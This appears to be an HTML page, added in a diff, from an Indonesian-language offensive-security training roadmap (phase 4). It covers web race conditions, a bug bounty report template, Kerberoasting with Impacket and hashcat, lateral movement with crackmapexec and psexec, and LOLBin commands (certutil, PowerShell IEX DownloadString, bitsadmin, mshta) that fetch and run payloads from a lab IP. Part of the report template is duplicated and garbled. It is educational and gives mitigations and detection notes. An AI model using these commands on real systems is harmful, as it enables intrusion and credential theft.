@@ -1,0 +1,270 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Fase 4 — Spesialisasi Offensive | Pixel Detective Academy</title>
+  <link rel="stylesheet" href="style.css" />
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&family=Inter:wght@400;600;800&display=swap" rel="stylesheet">
+</head>
+<body class="page-phase">
+
+  <nav class="toc">
+    <div class="toc-inner">
+      <span class="toc-title">// FASE 4</span>
+      <a href="index.html">🏠 Home</a>
+      <a href="fase1.html">1</a>
+      <a href="fase2.html">2</a>
+      <a href="fase3.html">3</a>
+      <a href="fase4.html" class="active">4</a>
+      <a href="fase5.html">5</a>
+      <a href="fase6.html">6</a>
+      <button id="printBtn" class="btn-print">🖨️ PDF</button>
+    </div>
+    <div class="progress-bar" id="progressBar"></div>
+  </nav>
+
+  <main class="container">
+
+    <header class="phase-hero reveal">
+      <div class="phase-num-big">04</div>
+      <div class="badge">FASE 4 • SPESIALISASI</div>
+      <h1>Spesialisasi Offensive</h1>
+      <p class="tagline">"Detektif generalis tahu banyak. Detektif spesialis tahu segalanya tentang satu hal."</p>
+      <p class="phase-duration">⏱️ 6–12 Bulan • 🎯 Target: 1 jalur dikuasai + 3 writeup publik</p>
+      <button class="mark-done-btn" data-phase="4">✓ Tandai Fase Ini Selesai</button>
+    </header>
+
+    <section class="reveal">
+      <h2>🎯 Pilih Jalurmu</h2>
+      <p>
+        Setelah fondasi + sertifikasi, saatnya <strong>spesialisasi</strong>. Tidak ada jalur
+        yang "lebih baik" — pilih berdasarkan minat dan peluang pasar.
+      </p>
+
+      <div class="spec-grid">
+        <div class="spec-card">
+          <h3>🌐 Jalur A: Web App Pentest / Bug Bounty</h3>
+          <p><strong>Cocok untuk:</strong> yang suka analisis logika aplikasi, API, dan bounty hunting.</p>
+          <ul>
+            <li>Advanced Web Exploitation (logic flaw, race condition, deserialization)</li>
+            <li>API security (REST, GraphQL, JWT)</li>
+            <li>Sertifikasi: OSWE, Burp Suite Certified Practitioner</li>
+            <li>Praktik: HackerOne, Bugcrowd, PortSwigger Expert labs</li>
+          </ul>
+        </div>
+
+        <div class="spec-card">
+          <h3>🖧 Jalur B: Network / Active Directory Pentest</h3>
+          <p><strong>Cocok untuk:</strong> yang suka eksplorasi jaringan internal & enterprise.</p>
+          <ul>
+            <li>Active Directory attacks (Kerberoasting, ACL abuse, lateral movement)</li>
+            <li>Pivoting & tunneling (chisel, ligolo-ng)</li>
+            <li>Sertifikasi: CRTP, OSEP</li>
+            <li>Praktik: HTB Pro Labs (Dante, Offshore), CRTP labs</li>
+          </ul>
+        </div>
+
+        <div class="spec-card">
+          <h3>🥷 Jalur C: Red Team / Evasion</h3>
+          <p><strong>Cocok untuk:</strong> yang suka stealth, evasion, dan simulasi adversary.</p>
+          <ul>
+            <li>C2 frameworks (Cobalt Strike, Sliver, Havoc)</li>
+            <li>AV/EDR bypass, LOLBins, obfuscation</li>
+            <li>Sertifikasi: CRTO, SANS SEC565</li>
+            <li>Praktik: CRTO labs, HTB Pro Labs (RastaLabs)</li>
+          </ul>
+        </div>
+      </div>
+    </section>
+
+    <section class="reveal">
+      <h2>🌐 4.1 Jalur A: Web App Pentest — Step-by-Step</h2>
+
+      <h3>Step 1: Kuasai Advanced Web Exploitation</h3>
+      <ol class="steps-list">
+        <li><strong>Business Logic Flaws</strong> — manipulasi alur bisnis (harga negatif, bypass limit, race condition).</li>
+        <li><strong>Race Conditions</strong> — exploit concurrent request (limit bypass, double spend). Tool: Turbo Intruder.</li>
+        <li><strong>Deserialization</strong> — Java/PHP/Python object injection. Tool: ysoserial, phpggc.</li>
+        <li><strong>API Security</strong> — GraphQL introspection, JWT misconfig, mass assignment, rate limit bypass.</li>
+        <li><strong>SSRF Advanced</strong> — bypass filter (DNS rebinding, redirect, IPv6), pivot ke cloud metadata.</li>
+      </ol>
+
+      <div class="example-box">
+        <h4>💡 Contoh Kompleks: Race Condition — Double Spend</h4>
+        <pre><code># Skenario: Aplikasi punya fitur "redeem voucher" — 1 voucher = 1x pakai
+# Target: kirim 20 request bersamaan, lihat apakah voucher bisa dipakai >1x
+
+# ── Menggunakan Turbo Intruder (Burp extension) ──
+def queueRequests(target, wordlists):
+    engine = RequestEngine(
+        endpoint=target.endpoint,
+        concurrentConnections=20,   # 20 koneksi paralel
+        requestsPerConnection=1,
+        pipeline=False
+    )
+    # Kirim 20 request identik secara bersamaan
+    for i in range(20):
+        engine.queue(target.req, gate='race1')
+    # Buka gate → semua request dikirim hampir bersamaan
+    engine.openGate('race1')
+
+def handleResponse(req, interesting):
+    # Cek response yang sukses (200) — jika >1, race condition confirmed
+    if '200' in req.response:
+        table.add(req)
+
+# ── Interpretasi hasil ──
+# Jika voucher hanya boleh 1x, response sukses seharusnya 1.
+# Jika muncul 2+ response "success" → race condition → double spend.
+
+# ── Mitigasi (untuk report) ──
+# - Gunakan database transaction dengan row-level lock (SELECT ... FOR UPDATE)
+# - Atau gunakan atomic operation (UPDATE ... WHERE used=0)
+# - Idempotency key untuk request yang sama</code></pre>
+        <p class="code-note">
+          <strong>Penjelasan:</strong> Race condition terjadi ketika aplikasi tidak mengunci
+          resource dengan benar saat concurrent request. Turbo Intruder memungkinkan kirim
+          request <em>benar-benar bersamaan</em> (bukan sequential).
+        </p>
+      </div>
+
+      <h3>Step 2: Bug Bounty Workflow</h3>
+      <ol class="steps-list">
+        <li><strong>Pilih program VDP</strong> (tanpa reward) dulu — HackerOne/Bugcrowd.</li>
+        <li><strong>Baca scope & rules</strong> — WAJIB. Jangan test di luar scope.</li>
+        <li><strong>Recon</strong> — pipeline dari Fase 2.</li>
+        <li><strong>Manual testing</strong> — fokus pada logic flaw, bukan hanya scanner.</li>
+        <li><strong>Dokumentasi</strong> — screenshot, request/response, impact, remediation.</li>
+        <li><strong>Report</strong> — gunakan template profesional.</li>
+      </ol>
+
+      <div class="example-box">
+        <h4>💡 Contoh Kompleks: Template Bug Bounty Report</h4>
+        <pre><code># Bug Report: IDOR pada /api/v1/invoices/{id}
+
+## Summary
+Endpoint `/api/v1/invoices/{id}` tidak memverifikasi ownership.
+User dapat mengakses invoice user lain dengan mengganti `id`.
+
+## Severity
+**High** (CVSS 7.5) — Unauthorized access ke data finansial (PII + payment info)
+
+## Steps to Reproduce
+1. Login sebagai user A (`attacker@example.com`)
+2. Akses `GET /api/v1/invoices/1001` → invoice milik user A
+3. Ganti id menjadi `1002` → `GET /api/v1/invoices/1002`
+4. Response 200 berisi invoice user B (nama, alamat, nominal, metode bayar)
+
+## Request
+```http
+GET /api/v1/invoices/1002 HTTP/1.1
+Host: api.target.com
+Authorization: Bearer <attacker_token>
+    ## Summary
+Endpoint `/api/v1/invoices/{id}` tidak memverifikasi ownership.
+User dapat mengakses invoice user lain dengan mengganti `id`.
+
+## Severity
+**High** (CVSS 7.5) — Unauthorized access ke data finansial (PII + payment info)
+
+## Steps to Reproduce
+1. Login sebagai user A (`attacker@example.com`)
+2. Akses `GET /api/v1/invoices/1001` → invoice milik user A
+3. Ganti id menjadi `1002` → `GET /api/v1/invoices/1002`
+4. Response 200 berisi invoice user B (nama, alamat, nominal, metode bayar)
+
+## Request
+```http
+GET /api/v1/invoices/1002 HTTP/1.1
+Host: api.target.com
+Authorization: Bearer <attacker_token>
+
+Response (redacted)
+json
+
+{
+  "id": 1002,
+  "user": "victim@example.com",
+  "amount": 1500000,
+  "address": "Jl. ...",
+  "payment_method": "credit_card_****1234"
+}
+
+Impact
+
+    Unauthorized access ke data finansial user lain
+
+    Potensi identity theft & fraud
+
+    Melanggar regulasi (UU PDP, GDPR)
+
+Remediation
+
+    Verifikasi ownership: WHERE id = ? AND user_id = ?
+
+    Gunakan UUID instead of sequential ID
+
+    Terapkan authorization middleware
+
+References
+
+    OWASP A01:2021 — Broken Access Control
+
+    CWE-639: Authorization Bypass Through User-Controlled Key</code></pre>
+    </div> <div class="target-box"> <strong>🎯 Target 4.1:</strong> Menyelesaikan 3+ lab PortSwigger Expert, submit 1+ report bug bounty (VDP), dan punya 3 writeup publik. </div> </section> <section class="reveal"> <h2>🖧 4.2 Jalur B: Active Directory Pentest — Step-by-Step</h2> <h3>Step 1: AD Fundamentals</h3> <ol class="steps-list"> <li><strong>Struktur AD</strong> — Domain, Forest, OU, Group, User, Computer, GPO.</li> <li><strong>Protokol AD</strong> — LDAP, Kerberos, DNS, SMB, RPC.</li> <li><strong>Kerberos Attack</strong> — Kerberoasting (SPN), AS-REP Roasting (no preauth), Golden/Silver Ticket.</li> <li><strong>ACL Abuse</strong> — GenericAll, WriteDACL, ForceChangePassword, AddMember.</li> <li><strong>Lateral Movement</strong> — PsExec, WMI, WinRM, SMB, RDP.</li> </ol> <div class="example-box"> <h4>💡 Contoh Kompleks: Kerberoasting dengan Impacket</h4> <pre><code># ── STEP 1: Enumerasi user dengan SPN (Service Principal Name) ──
+
+Dari mesin yang sudah compromise (domain user biasa):
+Menggunakan Impacket GetUserSPNs
+
+python3 GetUserSPNs.py -dc-ip 10.10.10.10
+DOMAIN.LOCAL/user:password
+-request -outputfile kerberoast.txt
+── STEP 2: Ekstrak hash ──
+Output: $krb5tgs$23∗svcsql∗svcs​qlDOMAIN.LOCAL......<hash>
+
+cat kerberoast.txt
+── STEP 3: Crack hash dengan Hashcat ──
+
+hashcat -m 13100 kerberoast.txt
+/usr/share/wordlists/rockyou.txt
+--force
+── STEP 4: Jika berhasil, dapat password service account ──
+Contoh: svc_sql : Summer2024!
+── STEP 5: Gunakan credential untuk lateral movement ──
+Cek akses ke service lain
+
+crackmapexec smb 10.10.10.0/24 -u svc_sql -p 'Summer2024!' --shares
+── STEP 6: Jika svc_sql punya akses admin ke server lain ──
+
+psexec.py DOMAIN.LOCAL/svc_sql:'Summer2024!'@10.10.10.20
+── Penjelasan ──
+Kerberoasting: request TGS ticket untuk service account,
+lalu crack offline. Tidak meninggalkan log mencurigakan di DC.
+Mitigasi: gunakan strong password (25+ char) untuk service account,
+atau Managed Service Account (gMSA).</code></pre>
+<p class="code-note"> <strong>Penjelasan:</strong> Kerberoasting adalah salah satu serangan AD paling umum. Kuncinya: service account sering punya password lemah + privilege tinggi. Crack offline = tidak terdeteksi. </p> </div> <div class="target-box"> <strong>🎯 Target 4.2:</strong> Menyelesaikan HTB Pro Lab Dante/Offshore, atau CRTP labs, dan bisa melakukan full AD attack chain (foothold → DA). </div> </section> <section class="reveal"> <h2>🥷 4.3 Jalur C: Red Team / Evasion — Step-by-Step</h2> <h3>Step 1: C2 Framework</h3> <ol class="steps-list"> <li><strong>Pahami C2</strong> — Command & Control: beacon, listener, payload, post-exploitation.</li> <li><strong>Pilih framework</strong> — Cobalt Strike (berbayar), Sliver/Havoc (open-source).</li> <li><strong>Setup listener</strong> — HTTP/HTTPS, DNS, SMB beacon.</li> <li><strong>Generate payload</strong> — stageless vs staged, shellcode injection.</li> <li><strong>Post-exploitation</strong> — credential dumping, lateral movement, persistence.</li> </ol> <h3>Step 2: Evasion Techniques</h3> <ol class="steps-list"> <li><strong>AV Bypass</strong> — obfuscation, encryption, packing, signature modification.</li> <li><strong>EDR Bypass</strong> — API unhooking, direct syscall, process injection, LOLBins.</li> <li><strong>Living-off-the-Land</strong> — gunakan binary legit (powershell, certutil, rundll32) untuk aktivitas malicious.</li> <li><strong>Obfuscation</strong> — PowerShell obfuscation (Invoke-Obfuscation), string encryption.</li> </ol> <div class="example-box"> <h4>💡 Contoh Kompleks: LOLBin — Download & Execute dengan Certutil</h4> <pre><code># ── Skenario: Setelah foothold, download tool tambahan tanpa curl/wget ── # Certutil adalah binary legit Windows — sering tidak diblokir EDR
+── STEP 1: Download payload ──
+
+certutil -urlcache -split -f http://10.10.14.5/tool.exe C:\Windows\Temp\tool.exe
+── STEP 2: Verifikasi download ──
+
+certutil -hashfile C:\Windows\Temp\tool.exe SHA256
+── STEP 3: Execute (jika perlu) ──
+
+C:\Windows\Temp\tool.exe
+── Alternatif LOLBin lain ──
+PowerShell download:
+
+powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.5/script.ps1')"
+Bitsadmin:
+
+bitsadmin /transfer job /download /priority normal http://10.10.14.5/tool.exe C:\Temp\tool.exe
+Mshta:
+
+mshta http://10.10.14.5/payload.hta
+── Deteksi (untuk blue team) ──
+Monitor: certutil -urlcache, bitsadmin /transfer, powershell IEX DownloadString
+Sigma rule: "Suspicious Certutil Usage"</code></pre>
+<p class="code-note"> <strong>Penjelasan:</strong> LOLBin (Living-off-the-Land Binary) adalah teknik menggunakan binary legit untuk tujuan malicious. Sulit dideteksi karena binary-nya sah. Red teamer harus paham ini; blue teamer harus bisa mendeteksinya. </p> </div> <div class="target-box"> <strong>🎯 Target 4.3:</strong> Menyelesaikan CRTO labs, bisa setup C2 + evasion dasar, dan paham cara mendeteksi teknik yang kamu gunakan (blue team perspective). </div> </section> <section class="reveal"> <h2>✅ Checklist Fase 4</h2> <div class="checklist"> <label><input type="checkbox" data-check="4-1"> Memilih 1 jalur spesialisasi</label> <label><input type="checkbox" data-check="4-2"> Menguasai advanced technique di jalur tersebut</label> <label><input type="checkbox" data-check="4-3"> Menyelesaikan lab spesialis (PortSwigger Expert / HTB Pro Lab / CRTO)</label> <label><input type="checkbox" data-check="4-4"> Punya 3+ writeup publik</label> <label><input type="checkbox" data-check="4-5"> Submit 1+ bug bounty report (VDP)</label> <label><input type="checkbox" data-check="4-6"> Bisa melakukan full attack chain di lab</label> <label><input type="checkbox" data-check="4-7"> Paham mitigasi & deteksi (blue team perspective)</label> </div> </section> <nav class="phase-nav"> <a href="fase3.html" class="phase-nav-prev">← Fase 3: Sertifikasi</a> <a href="fase5.html" class="phase-nav-next">Fase 5: Pixel Detective Edge →</a> </nav> </main> <footer class="footer"> <p><strong>PIXEL DETECTIVE ACADEMY</strong> — Fase 4</p> <p class="footer-tagline">"Zoom in. Find the flaw. Own the pixel."</p> </footer> <script src="app.js"></script></body> </html>
